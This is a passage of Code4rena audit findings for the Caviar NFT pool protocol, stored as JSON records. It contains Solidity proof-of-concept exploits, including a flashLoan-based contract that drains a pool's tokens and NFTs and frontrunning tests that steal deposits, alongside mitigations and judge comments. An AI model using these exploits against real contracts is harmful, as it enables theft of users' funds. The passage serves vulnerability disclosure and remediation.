`src/attacks/PrivatePoolExploit.sol`\n2.Save `Attack.t.sol` under path `src/test/PrivatePool/Attack.t.sol`\n3.Run the test with the command `forge test --match-contract AttackTest`\n\nPrivatePoolExploit.sol\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.19;\n\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\nimport {ERC721} from \"solmate/tokens/ERC721.sol\";\nimport {IERC3156FlashBorrower} from \"openzeppelin/interfaces/IERC3156FlashBorrower.sol\";\nimport {PrivatePool} from \"../PrivatePool.sol\";\n\n\ncontract PrivatePoolExploit is IERC3156FlashBorrower {\n    PrivatePool private immutable _privatePool;\n    ERC20 private immutable _baseToken;\n    ERC721 private immutable _nftToken;\n    address private immutable _owner;\n\n    uint private transferFromCalled;\n\n    uint[] private tokenIds;\n\n    constructor(PrivatePool _target) {\n        _privatePool = _target;\n        _baseToken = ERC20(_target.baseToken());\n        _nftToken = ERC721(_target.nft());\n        _owner = msg.sender;\n    }\n\n    function attack(uint[] calldata _tokenIds) external {\n        tokenIds = _tokenIds;\n        _privatePool.flashLoan(\n            this,\n            address(this),\n            0,\n            abi.encode(_tokenIds)\n        );\n    }\n\n\n    function safeTransferFrom(\n        address,\n        address,\n        uint256\n    ) public {\n    }\n\n    function onFlashLoan(\n        address,\n        address,\n        uint256,\n        uint256,\n        bytes calldata\n    ) external returns (bytes32) {\n        // Transfer all base tokens to this contract\n        _baseToken.transferFrom(address(_privatePool), address(this), _baseToken.balanceOf(address(_privatePool)));\n\n        // Transfer all NFTs to the owner\n        for (uint i = 0; i < tokenIds.length; i++) {\n            _nftToken.transferFrom(address(_privatePool), _owner, tokenIds[i]);\n        }\n\n        // Get the fee that needs to be repaid and approve the amount\n        uint256 fee = _privatePool.flashFee(address(0), 0);\n        _baseToken.approve(address(_privatePool), fee);\n\n        // Transfer all excess base tokens to the owner\n        _baseToken.transfer(_owner, _baseToken.balanceOf(address(this)));\n\n        return keccak256(\"ERC3156FlashBorrower.onFlashLoan\");\n    }\n\n    function ownerOf(uint) public view returns (address) {\n        return address(_privatePool);\n    }\n\n    function onERC721Received(\n        address,\n        address,\n        uint256,\n        bytes calldata\n    ) external pure returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n}\n```\n\nAttack.t.sol\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.19;\n\nimport \"../Fixture.sol\";\nimport \"../../src/attacks/PrivatePoolExploit.sol\";\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\n\ncontract ERC20Example is ERC20 {\n    constructor(string memory _name, string memory _symbol, uint8 _decimals) ERC20(_name, _symbol, _decimals) {\n        _mint(msg.sender, 100_000 * 10**_decimals);\n    }\n}\n\ncontract AttackTest is Fixture {\n    event Buy(\n        uint256[] tokenIds,\n        uint256[] tokenWeights,\n        uint256 inputAmount,\n        uint256 feeAmount,\n        uint256 protocolFeeAmount,\n        uint256 royaltyFeeAmount\n    );\n\n    address bob = address(0x1);\n    address alice = address(0x2);\n\n    PrivatePoolExploit public privatePoolExploit;\n    ERC20 public baseToken;\n\n    address nft = address(milady);\n    uint128 virtualBaseTokenReserves = 100e6;\n    uint128 virtualNftReserves = 5e18;\n    uint16 feeRate = 0;\n    uint56 changeFee = 0;\n    bytes32 merkleRoot = bytes32(0);\n    bytes32 salt = bytes32(0);\n    uint256 baseTokenAmount = 500e6;\n    uint256[] tokenIds;\n    uint256[] tokenWeights;\n    PrivatePool.MerkleMultiProof proofs;\n\n    function setUp() public {\n        vm.startPrank(bob);\n        privatePoolImplementation = new PrivatePool(address(factory), address(royaltyRegistry), address(stolenNftOracle));\n        baseToken = new ERC20Example(\"USDC\", \"USDC\", 6);\n\n\n        for (uint256 i = 0; i < 5; i++) {\n            milady.mint(address(bob), i);\n            tokenIds.push(i);\n        }\n    }\n\n    function test_exploit() public {\n\n        // Approve all NFTs and baseToken to the Factory\n        baseToken.approve(address(factory), type(uint256).max);\n        milady.setApprovalForAll(address(factory), true);\n\n\n        PrivatePool privatePool = factory.create(\n            address(baseToken),\n            address(milady),\n            virtualBaseTokenReserves,\n            virtualNftReserves,\n            changeFee,\n            feeRate,\n            merkleRoot,\n            true,\n            false,\n            salt,\n            tokenIds,\n            baseTokenAmount\n        );\n\n        // First Bob deploys the exploit contract\n        privatePoolExploit = new PrivatePoolExploit(privatePool);\n\n\n        // Then Bob approves the exploit contract to spend PrivatePool's baseToken and NFTs\n        privatePool.execute(\n            address(baseToken),\n            abi.encodeWithSignature(\"approve(address,uint256)\", address(privatePoolExploit), type(uint256).max)\n        );\n\n        privatePool.execute(\n            address(nft),\n            abi.encodeWithSignature(\"setApprovalForAll(address,bool)\", address(privatePoolExploit), true)\n        );\n\n\n        // Bob sells the ownership of the PrivatePool to Alice (as an example just transfering the ownership)\n        uint tokenIdOfPrivatePool = uint256(uint160(address(privatePool)));\n        factory.transferFrom(bob, alice, tokenIdOfPrivatePool);\n\n        assertEq(factory.ownerOf(tokenIdOfPrivatePool), alice);\n\n        uint balanceBeforeAttack = baseToken.balanceOf(bob);\n        uint erc721BalanceBeforeAttack = milady.balanceOf(bob);\n\n        // Bob runs the exploit\n        privatePoolExploit.attack(tokenIds);\n\n        uint balanceAfterAttack = baseToken.balanceOf(bob);\n        uint erc721BalanceAfterAttack = milady.balanceOf(bob);\n\n        assertEq(balanceAfterAttack, balanceBeforeAttack + baseTokenAmount - changeFee);\n        assertEq(erc721BalanceAfterAttack, erc721BalanceBeforeAttack + tokenIds.length);\n    }\n}\n```\n\nResult of the test\n```\nRunning 1 test for test/PrivatePool/Attack.t.sol:AttackTest\n[PASS] test_exploit() (gas: 1182634)\nTest result: ok. 1 passed; 0 failed; finished in 7.15ms\n```\n\n## Tools Used\nFoundry/VSCode\n\n## Recommended Mitigation Steps\nThe contract caller should not be able to choose the token address in the `PrivatePool.flashLoan`\nfunction because there is no way to know if the token contract is actually an ERC721 contract.\n\nSuggest removing `token` from function input parameters and using `nft` token everywhere, where `token` was used.\n\n```solidity\n    function flashLoan(IERC3156FlashBorrower receiver, uint256 tokenId, bytes calldata data)\n        external\n        payable\n        returns (bool)\n    {\n        address nftAddress = nft;\n        // check that the NFT is available for a flash loan\n        if (!availableForFlashLoan(nftAddress, tokenId)) revert NotAvailableForFlashLoan();\n\n        // calculate the fee\n        uint256 fee = flashFee(nftAddress, tokenId);\n\n        // if base token is ETH then check that caller sent enough for the fee\n        if (baseToken == address(0) && msg.value < fee) revert InvalidEthAmount();\n\n        // transfer the NFT to the borrower\n        ERC721(nftAddress).safeTransferFrom(address(this), address(receiver), tokenId);\n\n        // call the borrower\n        bool success =\n            receiver.onFlashLoan(msg.sender, nftAddress, tokenId, fee, data) == keccak256(\"ERC3156FlashBorrower.onFlashLoan\");\n\n        // check that flashloan was successful\n        if (!success) revert FlashLoanFailed();\n\n        // transfer the NFT from the borrower\n        ERC721(nftAddress).safeTransferFrom(address(receiver), address(this), tokenId);\n\n        // transfer the fee from the borrower\n        if (baseToken != address(0)) ERC20(baseToken).transferFrom(msg.sender, address(this), fee);\n\n        return success;\n    }\n```",
      "summary": "\nA vulnerability in the PrivatePool.sol smart contract was identified that allows ERC721 and ERC20 tokens to be stolen by the previous owner via the execute and flashLoan functions, or by malicious approval by the current owner via execute. The bug was identified using Foundry/VSCode and a Proof of Concept was provided to replicate the bug.\n\nThe bug occurs when Bob creates a PrivatePool.sol contract and deposits 5 ERC721 tokens and 500 USDC. Bob then creates a malicious contract to call the PrivatePool.flashLoan function. Bob then approves USDC spending and setsApprovalForAll for ERC721 tokens. Bob then sells the ownership of the PrivatePool to Alice, and then runs the PrivatePoolExploit.attack function which calls the PrivatePool.flashLoan function. This allows Bob to transfer all funds to himself, leaving Alice's PrivatePool with nothing.\n\nThe recommended mitigation steps to prevent this bug are to not allow the contract caller to choose the token address in the PrivatePool.flashLoan function, and to remove token from the function input parameters and use nft token everywhere where token was used.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/230",
      "tags": [
        "Flash Loan"
      ],
      "finders": [
        "Brenzee",
        "ulqiorra  ladboy233"
      ]
    },
    {
      "id": "16259",
      "title": "[M-14] The royaltyRecipient could not be prepare to receive ether, making the sell to fail",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/EthRouter.sol#L188-L191\n\n\n## Vulnerability details\n\n## Impact\nThe `royaltyRecipient` is an arbitrary address setup by the collection if the collection `royaltyRecipient` is a contract and this contract its not prepared to receive ether the ether transfer will always fail paying the royalties.\n\n\n\n## Proof of Concept\nHere is a foundry POC, take note that i have to write a new Milady mock collection because in the original is hardcoded to `0xbeefbeef` so its impossible to change the `royaltyRecipient`;  [Milady.sol#L31](https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/test/shared/Milady.sol#L31)\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.19;\n\nimport \"test/Fixture.sol\";\n\ncontract POCRejectTest is Fixture {\n    PrivatePool public privatePool;\n    uint256 public totalTokens = 0;\n    uint256 public minOutputAmount = 0;\n\n    uint256 royaltyFeeRate = 0.1e18; // 10%\n    address royaltyRecipient = address(new EthRejecter());\n\n    Milady2 milady2 = new Milady2();\n\n    function setUp() public {\n        milady2.setApprovalForAll(address(ethRouter), true);\n\n        vm.mockCall(\n            address(milady2),\n            abi.encodeWithSelector(ERC721.ownerOf.selector, address(privatePool)),\n            abi.encode(address(this))\n        );\n\n        // lets setup a trap for the royalty        \n        milady2.setRoyaltyInfo(royaltyFeeRate, royaltyRecipient);\n\n    }\n\n    function _addSell() internal returns (EthRouter.Sell memory, uint256) {\n        uint256[] memory empty = new uint256[](0);\n        privatePool = factory.create{value: 100e18}(\n            address(0),\n            address(milady2),\n            100e18,\n            10e18,\n            200,\n            199,\n            bytes32(0),\n            true,\n            false,\n            bytes32(address(this).balance), // random between each call to _addBuy\n            empty,\n            100e18\n        );\n\n        uint256[] memory tokenIds = new uint256[](2);\n        for (uint256 i = 0; i < 2; i++) {\n            milady2.mint(address(this), i + totalTokens);\n            tokenIds[i] = i + totalTokens;\n        }\n\n        totalTokens += 2;\n\n        bytes32[][] memory publicPoolProofs = new bytes32[][](0);\n        EthRouter.Sell memory sell = EthRouter.Sell({\n            pool: payable(address(privatePool)),\n            nft: address(milady2),\n            tokenIds: tokenIds,\n            tokenWeights: new uint256[](0),\n            proof: PrivatePool.MerkleMultiProof(new bytes32[](0), new bool[](0)),\n            stolenNftProofs: new IStolenNftOracle.Message[](0),\n            isPublicPool: false,\n            publicPoolProofs: publicPoolProofs\n        });\n\n        (uint256 baseTokenAmount,,) = privatePool.sellQuote(tokenIds.length * 1e18);\n        return (sell, baseTokenAmount);\n    }\n\n    function test_PaysRoyalties() public {\n        // arrange\n        EthRouter.Sell[] memory sells = new EthRouter.Sell[](3);\n        (EthRouter.Sell memory sell1, uint256 outputAmount1) = _addSell();\n        (EthRouter.Sell memory sell2, uint256 outputAmount2) = _addSell();\n        minOutputAmount += outputAmount1 + outputAmount2;\n        sells[0] = sell1;\n        sells[1] = sell2;\n        Pair pair = caviar.create(address(milady2), address(0), bytes32(0));\n        deal(address(pair), 1.123e18);\n        deal(address(pair), address(pair), 10e18);\n\n        uint256[] memory tokenIds = new uint256[](2);\n        for (uint256 i = 0; i < tokenIds.length; i++) {\n            tokenIds[i] = i + totalTokens;\n            milady2.mint(address(this), i + totalTokens);\n        }\n        sells[2] = EthRouter.Sell({\n            pool: payable(address(pair)),\n            nft: address(milady2),\n            tokenIds: tokenIds,\n            tokenWeights: new uint256[](0),\n            proof: PrivatePool.MerkleMultiProof(new bytes32[](0), new bool[](0)),\n            stolenNftProofs: new IStolenNftOracle.Message[](0),\n            isPublicPool: true,\n            publicPoolProofs: new bytes32[][](0)\n        });\n\n        uint256 outputAmount = pair.sellQuote(tokenIds.length * 1e18);\n\n        uint256 royaltyFee = outputAmount / tokenIds.length * royaltyFeeRate / 1e18 * tokenIds.length;\n        outputAmount -= royaltyFee;\n        minOutputAmount += outputAmount;\n\n        // act\n        ethRouter.sell(sells, minOutputAmount, 0, true);\n\n        // assert\n        assertEq(address(royaltyRecipient).balance, royaltyFee, \"Should have paid royalties\");\n        assertGt(address(royaltyRecipient).balance, 0, \"Should have paid royalties\");\n    }\n}\n\ncontract EthRejecter {\n    // The contract could not have a method called \"receive\" or \"fallback\", i added here\n    // to show the concept of a contract that rejects ETH\n    receive() external payable {\n        revert(\"ETH REJECTED EXAMPLE\");\n    }\n}\n\ncontract Milady2 is ERC721, ERC2981 {\n    uint256 public royaltyFeeRate = 0; // to 18 decimals\n    address public royaltyRecipient = address(0);\n\n    constructor() ERC721(\"Milady Maker\", \"MIL\") {}\n\n    function tokenURI(uint256) public view virtual override returns (string memory) {\n        return \"https://milady.io\";\n    }\n\n    function mint(address to, uint256 id) public {\n        _mint(to, id);\n    }\n\n    function setRoyaltyInfo(uint256 _royaltyFeeRate, address _royaltyRecipient) public {\n        royaltyFeeRate = _royaltyFeeRate;\n        royaltyRecipient = _royaltyRecipient;\n    }\n\n    function supportsInterface(bytes4 interfaceId) public view override(ERC2981, ERC721) returns (bool) {\n        return super.supportsInterface(interfaceId);\n    }\n\n    function royaltyInfo(uint256, uint256 salePrice) public view override returns (address, uint256) {\n        return (royaltyRecipient, salePrice * royaltyFeeRate / 1e18);\n    }\n}\n\n```\n\n\n## Tools Used\nManual revision\n\n\n## Recommended Mitigation Steps\n\nThere are two simple ways from my point of view to force ether send and solve this issue;\n\nYou could use a simple contract that selfdestrcut an firce ether, but selfdestruct is deprecated so its not a good idea, please view [solady/SafeTransferLib.sol#L65](https://github.com/Vectorized/solady/blob/main/src/utils/SafeTransferLib.sol#L65)\n\nThe other think you could do is if a address is rejecting ether, send WETH instead, this pattern is common and well known.",
      "summary": "\nThis bug report is about a vulnerability found in the code for the EthRouter.sol contract, which is responsible for paying royalties to a recipient. The vulnerability is that if the recipient is a contract that is not prepared to receive ether, the ether transfer will fail and the royalties will not be paid. A proof of concept was provided, showing that a Milady mock collection was needed to change the royalty recipient. The recommended mitigation steps are to either use a contract that selfdestructs to force ether send, or to send WETH instead if the address is rejecting ether.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/263",
      "tags": [],
      "finders": [
        "Bauer",
        "Koolex",
        "ladboy233",
        "shaka",
        "saian",
        "SovaSlava",
        "Kenshin",
        "0x4non"
      ]
    },
    {
      "id": "16258",
      "title": "[M-13] Transaction revert if the baseToken does not support 0 value transfer when charging changeFee",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L423\nhttps://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L651\n\n\n## Vulnerability details\n\n## Impact\n\nTransaction revert if the baseToken does not support 0 value transfer when charging changeFee\n\n## Proof of Concept\n\nWhen call change via the PrivatePool.sol, the caller needs to the pay the change fee,\n\n```solidity\n\t// calculate the fee amount\n\t(feeAmount, protocolFeeAmount) = changeFeeQuote(inputWeightSum);\n}\n\n// ~~~ Interactions ~~~ //\n\nif (baseToken != address(0)) {\n\t// transfer the fee amount of base tokens from the caller\n\tERC20(baseToken).safeTransferFrom(\n\t\tmsg.sender,\n\t\taddress(this),\n\t\tfeeAmount\n\t);\n```\n\ncalling changeFeeQuote(inputWeightSum)\n\n```solidity\nfunction changeFeeQuote(\n\tuint256 inputAmount\n) public view returns (uint256 feeAmount, uint256 protocolFeeAmount) {\n\t// multiply the changeFee to get the fee per NFT (4 decimals of accuracy)\n\tuint256 exponent = baseToken == address(0)\n\t\t? 18 - 4\n\t\t: ERC20(baseToken).decimals() - 4;\n\tuint256 feePerNft = changeFee * 10 ** exponent;\n\n\tfeeAmount = (inputAmount * feePerNft) / 1e18;\n\tprotocolFeeAmount =\n\t\t(feeAmount * Factory(factory).protocolFeeRate()) /\n\t\t10_000;\n}\n```\n\nif the feeAmount is 0,\n\nthe code below woud revert if the ERC20 token does not support 0 value transfer\n\n```solidity\nERC20(baseToken).safeTransferFrom(\n\tmsg.sender,\n\taddress(this),\n\tfeeAmount\n);\n```\n\nAccording to https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers\n\n> Some tokens (e.g. LEND) revert when transferring a zero value amount.\n\nSame issue happens when charging the flashloan fee\n\n```solidity\n    function flashLoan(\n        IERC3156FlashBorrower receiver,\n        address token,\n        uint256 tokenId,\n        bytes calldata data\n    ) external payable returns (bool) {\n        // check that the NFT is available for a flash loan\n        if (!availableForFlashLoan(token, tokenId))\n            revert NotAvailableForFlashLoan();\n\n        // calculate the fee\n        uint256 fee = flashFee(token, tokenId);\n\n        // if base token is ETH then check that caller sent enough for the fee\n        if (baseToken == address(0) && msg.value < fee)\n            revert InvalidEthAmount();\n\n        // transfer the NFT to the borrower\n        ERC721(token).safeTransferFrom(\n            address(this),\n            address(receiver),\n            tokenId\n        );\n\n        // call the borrower\n        bool success = receiver.onFlashLoan(\n            msg.sender,\n            token,\n            tokenId,\n            fee,\n            data\n        ) == keccak256(\"ERC3156FlashBorrower.onFlashLoan\");\n\n        // check that flashloan was successful\n        if (!success) revert FlashLoanFailed();\n\n        // transfer the NFT from the borrower\n        ERC721(token).safeTransferFrom(\n            address(receiver),\n            address(this),\n            tokenId\n        );\n\n        // transfer the fee from the borrower\n        if (baseToken != address(0))\n            ERC20(baseToken).transferFrom(msg.sender, address(this), fee);\n\n        return success;\n    }\n```\n\nnote the code:\n\n```solidity\nif (baseToken != address(0))\n            ERC20(baseToken).transferFrom(msg.sender, address(this), fee);\n```\n\nif the fee is 0 and baseToken revert in 0 value transfer, the user cannot use flashloan\n\n## Tools Used\n\nManual Review\n\n## Recommended Mitigation Steps\n\nWe recommend the protocol check if the feeAmount is 0 before performing transfer\n\n```solidity\nif(feeAmount > 0) {\n\tERC20(baseToken).safeTransferFrom(\n\t\tmsg.sender,\n\t\taddress(this),\n\t\tfeeAmount\n\t);\n}\n```",
      "summary": "\nThis bug report is about a vulnerability in the code of the PrivatePool.sol, which is a part of the code-423n4/2023-04-caviar repository. The vulnerability occurs when the baseToken does not support 0 value transfers when charging changeFee. This can cause a transaction to revert. The proof of concept explains how this can happen when the changeFeeQuote(inputWeightSum) is called and the feeAmount is 0. According to a source, some tokens (e.g. LEND) revert when transferring a zero value amount. The same issue can happen when charging the flashloan fee. The recommended mitigation step is to check if the feeAmount is 0 before performing the transfer.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/278",
      "tags": [
        "Revert On 0 Transfer"
      ],
      "finders": [
        "ladboy233",
        "jpserrat",
        "0xLanterns",
        "chaduke",
        "peanuts",
        "adriro"
      ]
    },
    {
      "id": "16257",
      "title": "[M-12] Prohibition to create private pools with the factory NFT",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L157>\n\n<https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L623>\n\n<https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L514>\n\n### Impact\n\nAny [Factory NFTs](https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/Factory.sol#L37) deposited into a Factory-PrivatePool can have all assets in the corresponding PrivatePools stolen by malicious users.\n\n### Proof of Concept\n\nSuppose there are two PrivatePools p1 and p2, `p1.nft = address(Factory)`, and `uint256(p1)` and `uint256(p2)` are deposited into p1.<br>\nMalicious users can use [flashloan()](https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L623) to steal all the base tokens in p1 and p2:\n\n1.  Call `p1.flashloan()` to borrow the Factory NFT - `uint256(p1)` from p1.\n2.  In the flashloan callback, call `p1.withdraw()` to withdraw all the base tokens and the factory NFT - `uint256(p2)` from p1.\n3.  Return `uint256(p1)` to p1.\n\nSuppose there are two PrivatePools p1 and p2, `p1.nft = address(Factory)`, and `uint256(p2)` is deposited into p1.<br>\nMalicious users can use [flashloan()](https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L623) to steal all the base tokens and NFTs in p2:\n\n1.  Call `p1.flashloan()` to borrow factory NFT - `uint256(p2)` from p1.\n2.  In the flashloan callback, call `p2.withdraw()` to steal all the base tokens and NFTs in p2.\n3.  Return `uint256(p2)` to p1.\n\nIn addition, malicious users can also steal assets in p2 by:\n\n1.  [`p1.buy(uint256(p2))`](https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L211)\n2.  [`p2.withdraw(...)`](https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L514)\n3.  [`p1.sell(uint256(p2)`](https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L301).\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nTo prevent users from misusing the protocol and causing financial losses, we should prohibit the creation of PrivatePools with the Factory NFT:\n\n    diff --git a/src/PrivatePool.sol b/src/PrivatePool.sol\n    index 75991e1..14ec386 100644\n    --- a/src/PrivatePool.sol\n    +++ b/src/PrivatePool.sol\n    @@ -171,6 +171,8 @@ contract PrivatePool is ERC721TokenReceiver {\n             // check that the fee rate is less than 50%\n             if (_feeRate > 5_000) revert FeeRateTooHigh();\n\n    +        require(_nft != factory, \"Unsupported NFT\");\n    +\n             // set the state variables\n             baseToken = _baseToken;\n             nft = _nft;\n\n**[outdoteth (Caviar) confirmed and mitigated](https://github.com/code-423n4/2023-04-caviar-findings/issues/353#issuecomment-1520543927):**\n > Fixed in: https://github.com/outdoteth/caviar-private-pools/pull/14\n> \n> Proposed fix is to add a check that ensures that the nft which is used in the private pool is not a private pool NFT from the factory contract.\n> \n> ```solidity\n> // check that the nft is not a private pool NFT\n> if (_nft == factory) revert PrivatePoolNftNotSupported();\n> ```\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/353#issuecomment-1528975099):**\n > Judging severity on this finding is contingent on determining if using the `factory` as NFT is an external requirement or not\n>\n > Will seek advice from another Judge, but saying \"if they do it, they lose everything\" doesn't sound like an external requirement\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/353#issuecomment-1534397831):**\n > After further thinking, I believe the finding has shown a vulnerability in how the pool may be used for composability.\n> \n> I believe that similar \"vault like\" NFTs may be subject to the same risks, there's another audit happening at this time that may also be subject to the same risk.\n> \n> Those instances would mostly be categorized as Medium Severity, because the implementations are not known.\n> \n> After discussing with additional judges, given that there are a category of NFTs that should not be Flashloaned (e.g. UniV3, Factory, other factories, etc..) believe it is most appropriate to judge the finding as Medium Severity, with the additional warning that similar \"vault like\" NFTs should also be examined with care.\n> \n> The risk doesn't apply to ordinary collections.\n\n**Status:** Mitigation confirmed with comments. Full details in reports from [rbserver](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/22), [KrisApostolov](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/45), and [rvierdiiev](https://github.com/code-423n4/2023-05-caviar-mitigation-contest-findings/issues/15).\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the PrivatePool smart contract code, which is part of the Caviar protocol. This vulnerability allows malicious users to steal all assets in the corresponding PrivatePools if Factory NFTs are deposited into them. The malicious user can use the flashloan() function to borrow the Factory NFT and then withdraw all the base tokens and the Factory NFT from the pool. In addition, they can also use the buy(), withdraw(), and sell() functions to steal assets from the PrivatePool.\n\nTo prevent this vulnerability, the code should be modified to prohibit the creation of PrivatePools with the Factory NFT. The recommended mitigation step is to add a require() statement to the code to check that the NFT is not equal to the Factory NFT.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/353",
      "tags": [
        "Flash Loan"
      ],
      "finders": [
        "tanh",
        "hihen"
      ]
    },
    {
      "id": "16256",
      "title": "[M-11] Factory.create: Predictability of pool address creates multiple issues.",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/Factory.sol#L92\n\n\n## Vulnerability details\n\n## Impact\nThe `Factory.create` function is responsible for creating new `PrivatePool`s. It does this using the `LibClone.cloneDeterministic` function.\n\n```solidity\n    function create(\n        ...\n        bytes32 _salt,\n        ...\n    ) public payable returns (PrivatePool privatePool) {\n        if ((_baseToken == address(0) && msg.value != baseTokenAmount) || (_baseToken != address(0) && msg.value > 0)) {\n            revert PrivatePool.InvalidEthAmount();\n        }\n\n        // deploy a minimal proxy clone of the private pool implementation\n        privatePool = PrivatePool(payable(privatePoolImplementation.cloneDeterministic(_salt)));\n\n        // ...\n    }\n```\n\nThe address of the new PrivatePool depends solely upon the `_salt` parameter provided by the user. Once the user's create transaction is broadcasted, the  `_salt` parameter can be viewed by anyone watching the public mempool.\n\nThis public readability of `_salt` parameter creates two issues:\n\n1. Stealing of user's deposit amount.\nIf a user intends to create new pool and deposit some funds in it then an attacker can frontrun the user's txns and capture the deposit amounts. Here is how this can happen:\n     - User broadcasts two txns, first one to create a pool with `XXX` as the salt and second one to deposit some ETH into the new pool.\n     - The attacker views these pending txns and frontruns them to create a PrivatePool for himself with same `XXX` salt.\n     - The new pool gets created for the attacker, the address of this pool will be same as what the user will be expecting for his pool.\n     - The user's create pool txn gets reverted but deposit txn gets executed successfully. Hence the user deposited ETH in  attacker's pool.\n     - Being the owner of the pool the attacker simply withdraws the deposited ETH from the PrivatePool.\n\n2. DoS for `Factory.create`.\nIf a user intends to create a PrivatePool, his create txn can be forcefully reverted by an attacker by deploying a pool for himself using the user's salt. Here is how this can happen:\n    - The user broadcasts the create pool txn with salt `XXX`.\n    - The attacker frontruns the user's txn and creates a pool for hiself using the same `XXX` salt.\n    - The user's original create txn gets reverted as attacker's pool already exist on the predetermined address.\n    - This attack can be repeated again and again resulting in DoS for the `Factory.create` function.\n\n## Proof of Concept\nThese test cases were added to `test/PrivatePool/Withdraw.t.sol` file and were ran using `forge test --ffi --mp test/PrivatePool/Withdraw.t.sol --mt test_audit`\n\n```solidity\n    function test_audit_create_stealDeposit() public {\n        address user1 = makeAddr(\"user1\");\n        vm.deal(user1, 10 ether);\n        vm.startPrank(user1);\n\n        address predictedAddress = factory.predictPoolDeploymentAddress(bytes32(0));\n\n        // tries to create pool and deposit funds\n        // 1. factory.create(...)\n        // 2. pool.deposit(...)\n\n        // but user2 frontruns the txns\n\n        address user2 = makeAddr(\"user2\");\n        changePrank(user2);\n\n        uint baseTokenAmount = 0;\n\n        PrivatePool pool = factory.create{value: baseTokenAmount}(\n            baseToken,\n            nft,\n            virtualBaseTokenReserves,\n            virtualNftReserves,\n            changeFee,\n            feeRate,\n            merkleRoot,\n            true,\n            false,\n            bytes32(0),\n            tokenIds,\n            baseTokenAmount\n        );\n        assertEq(predictedAddress, address(pool));\n        assertEq(factory.ownerOf(uint256(uint160(address(pool)))), address(user2));\n\n        changePrank(user1);\n\n        vm.expectRevert(LibClone.DeploymentFailed.selector);\n        factory.create{value: baseTokenAmount}(\n            baseToken,\n            nft,\n            virtualBaseTokenReserves,\n            virtualNftReserves,\n            changeFee,\n            feeRate,\n            merkleRoot,\n            true,\n            false,\n            bytes32(0),\n            tokenIds,\n            baseTokenAmount\n        );\n\n        pool.deposit{ value: 10 ether }(tokenIds, 10 ether);\n        assertEq(address(pool).balance, 10 ether);\n\n        changePrank(user2);\n        pool.withdraw(address(0), tokenIds, address(0), 10 ether);\n        assertEq(address(pool).balance, 0);\n        assertEq(user2.balance, 10 ether);\n    }\n\n    function test_audit_create_DoS() public {\n        address user1 = makeAddr(\"user1\");\n        vm.deal(user1, 10 ether);\n        vm.startPrank(user1);\n\n        address predictedAddress = factory.predictPoolDeploymentAddress(bytes32(0));\n\n        // user1 tries to create pool\n        // factory.create(...)\n\n        // but user2 frontruns the txn\n\n        address user2 = makeAddr(\"user2\");\n        changePrank(user2);\n\n        uint baseTokenAmount = 0;\n\n        PrivatePool pool = factory.create{value: baseTokenAmount}(\n            baseToken,\n            nft,\n            virtualBaseTokenReserves,\n            virtualNftReserves,\n            changeFee,\n            feeRate,\n            merkleRoot,\n            true,\n            false,\n            bytes32(0),\n            tokenIds,\n            baseTokenAmount\n        );\n        assertEq(predictedAddress, address(pool));\n        assertEq(factory.ownerOf(uint256(uint160(address(pool)))), address(user2));\n\n        changePrank(user1);\n\n        